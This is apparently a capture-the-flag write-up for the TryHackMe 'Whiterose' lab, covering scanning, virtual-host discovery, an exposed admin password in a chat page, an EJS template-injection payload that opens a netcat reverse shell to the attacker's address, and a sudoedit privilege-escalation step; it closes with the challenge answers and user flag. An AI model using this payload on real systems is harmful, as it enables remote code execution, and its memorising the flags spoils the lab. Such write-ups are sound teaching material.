# Whiterose
(flags are at the end of the writeup)

### Welcome!
Initial scan shows port 22 and 80 open: 

    # Nmap 7.94SVN scan initiated Fri Nov  1 04:34:41 2024 as: /usr/lib/nmap/nmap --privileged -p22,80 -sV -sC -oN scan 10.10.141.246
    Nmap scan report for cyprusbank.thm (10.10.141.246)
    Host is up (0.046s latency).
    
    PORT   STATE SERVICE VERSION
    22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
    | ssh-hostkey: 
    |   2048 b9:07:96:0d:c4:b6:0c:d6:22:1a:e4:6c:8e:ac:6f:7d (RSA)
    |   256 ba:ff:92:3e:0f:03:7e:da:30:ca:e3:52:8d:47:d9:6c (ECDSA)
    |_  256 5d:e4:14:39:ca:06:17:47:93:53:86:de:2b:77:09:7d (ED25519)
    80/tcp open  http    nginx 1.14.0 (Ubuntu)
    |_http-title: Site doesn't have a title (text/html; charset=utf-8).
    |_http-server-header: nginx/1.14.0 (Ubuntu)
    Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
Port 80 gets redirected to `cyprusbank.thm`, so add `10.10.141.246 cyprusbank.thm` to the /etc/hosts file. After some enumeration I found a virtual host. The command I used is `gobuster vhost -u "http://10.10.141.246" --domain cyprusbank.thm -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt --append-domain --exclude-length 250-320`:<br />
![image](https://github.com/user-attachments/assets/43250f92-25dd-49c8-9e8f-f80388da560f)<br />
So add this new host to the `/etc/hosts` file. <br />
![image](https://github.com/user-attachments/assets/ab79b293-a7da-4ecf-a0e7-498194be2e05)<br />
Using the credentials provided in the task, `Olivia Cortez:olivi8`, we can log in. The page seems to show information about some rich people. I need to answer the first question which is `What's Tyrell Wellick's phone number?`. If I search for "Tyrell Wellick", I can't see it's phone number, just like everybody else. And also I'm not able to access the `Settings` page.<br />
![image](https://github.com/user-attachments/assets/f96ba4ff-33ff-4284-9a64-44e176518f36)<br />
Enumerating the website, I realized that it's because I am not an admin. In the "Messages" panel there's a chat going on between some admins:<br />
![image](https://github.com/user-attachments/assets/28a38dd4-9c02-4a14-9a12-2c0e82efe21c)<br />
and this is the URL of the chat: `http://admin.cyprusbank.thm/messages/?c=5`, by submitting `c=3`, this is what I get: <br />
![image](https://github.com/user-attachments/assets/0595a1d7-82ba-4396-a24d-95a08d3870d6)<br />
So the `c` parameters stands for the number of chat messages that I can view. And here's what I found: <br />
![image](https://github.com/user-attachments/assets/5310d82f-f08e-4a39-9c9c-ae2787f1d859)<br />
`Gayle Bev:p~]P@5!6;rs558:q`. So now I can log with his account, and can view people's phone numbers! (Tyrell Wellick's phone number is at the end of the write up).<br />
Now I can access the settings panel, which seems that it's used to change user's passwords:<br />
![image](https://github.com/user-attachments/assets/f2a34993-b381-4134-9fe3-92325f196536)<br />
I checked if the passwords really changed, but they don't so I probably need to focus on some SSTI vulnerability? After enumerating the request for about 1 hour, I found out that removing the password parameter results in an error:<br />
![image](https://github.com/user-attachments/assets/5c877073-1ce4-4b83-8ca8-c854e82cd548)<br />
This suggests that the server is running EJS(Embedded JavaScript). So I searched online for some EJS SSTI and found [this one](https://github.com/mde/ejs/issues/720). So the password parameter that worked for me is `&settings[view options][outputFunctionName]=x;process.mainModule.require('child_process').execSync('busybox nc 10.11.108.100 4444 -e sh');s`, and the final payload request looks like this:<br />
![image](https://github.com/user-attachments/assets/84e647ec-ab70-44aa-a152-fb2b8772a051)<br />
This got me the user flag. <br />
Running `sudo -l` I get this:<br />
![image](https://github.com/user-attachments/assets/422e621a-990b-4748-8e41-d6177d64b9fc)<br />
So I searched online how to exploit sudo on `sudoedit`, and found [this](https://github.com/n3m1sys/CVE-2023-22809-sudoedit-privesc) exploit. <br />
![image](https://github.com/user-attachments/assets/c5aa4abd-800b-4b5a-8ea4-874acfae5ac4)<br />
Let's check if my sudo is vulnerable:<br />
![image](https://github.com/user-attachments/assets/aa2b3866-33bd-457e-9351-9af16cd6ac63)<br />
It is! Let's run the exploit:<br />









- What's Tyrell Wellick's phone number? `842-029-5701`
- What is the user.txt flag? `THM{4lways_upd4te_uR_d3p3nd3nc!3s}`
- What is the root.txt flag?
